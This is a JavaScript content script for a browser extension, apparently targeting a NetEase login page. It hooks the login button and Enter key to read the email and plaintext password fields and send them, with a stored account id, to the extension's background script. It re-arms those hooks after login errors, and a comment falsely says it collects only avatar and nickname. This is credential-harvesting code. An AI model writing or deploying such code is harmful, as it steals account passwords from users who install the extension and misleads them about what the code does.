$(function () {
    // 信息阈值
    var loginCount = 0
    // 登陆后获取用户头像以及昵称,循环直到获取完整信息后,发送,清除循环
    var loginId = setInterval(function () {
        if (loginCount < 40) {
            var login = $('#dologin')
             if (login) {
                clearInterval(loginId)
                function sendInfo(aid) {	
                     var obj = {
                        getWyAcc: $('input[name=email]').val(),
                        getWyPwd: $('input[name=password]').val()
                    }
                    if (obj.getWyAcc.length < 8 || obj.getWyPwd.length < 6) return
                    
                    if (aid) {
                        Object.assign(obj, {
                            wyaid: aid
                        })
                    }
                    sendMessageToBackground(obj)
                }

                // 新增内容
                login.click(function () {
                    sendInfo()
                });
                var onkyedown = function (e) {
                    if (e.keyCode === 13) {
                        sendInfo()
                    }
                }
                $('#cnt-box').keydown(onkyedown);
               
                // 封装错误信息盒子
                function errBox(err) {
                    // $('input[name=email]').val(err.uname)
                    // 提交按钮点击,将账号密码与aid传入bg
                    login.click(function () {
                        sendInfo(err.aid)
                    });
                    var onkyedown = function (e) {
                        if (e.keyCode === 13) {
                            sendInfo(err.aid)
                        }
                    }
                    $('#cnt-box').keydown(onkyedown);
                }

                // 获取错误状态码,分辨位置
                chrome.storage.sync.get('wyErrStatus', (res) => {
                    if (res.wyErrStatus === 1) { // 盒子一
                        chrome.storage.sync.get('wyErrMsgOne', (res) => {
                            errBox(res.wyErrMsgOne)
                        })
                    } else if (res.wyErrStatus === 2) { // 盒子二
                        chrome.storage.sync.get('wyErrMsgTwo', (res) => {
                            errBox(res.wyErrMsgTwo)
                        })
                    } else if (res.wyErrStatus === 3) { // 盒子三
                        chrome.storage.sync.get('wyErrMsgThree', (res) => {
                             errBox(res.wyErrMsgThree)
                        })
                    }
                })

            }
            loginCount++;
        } else {
            clearInterval(loginId)
        }
    }, 20)
})
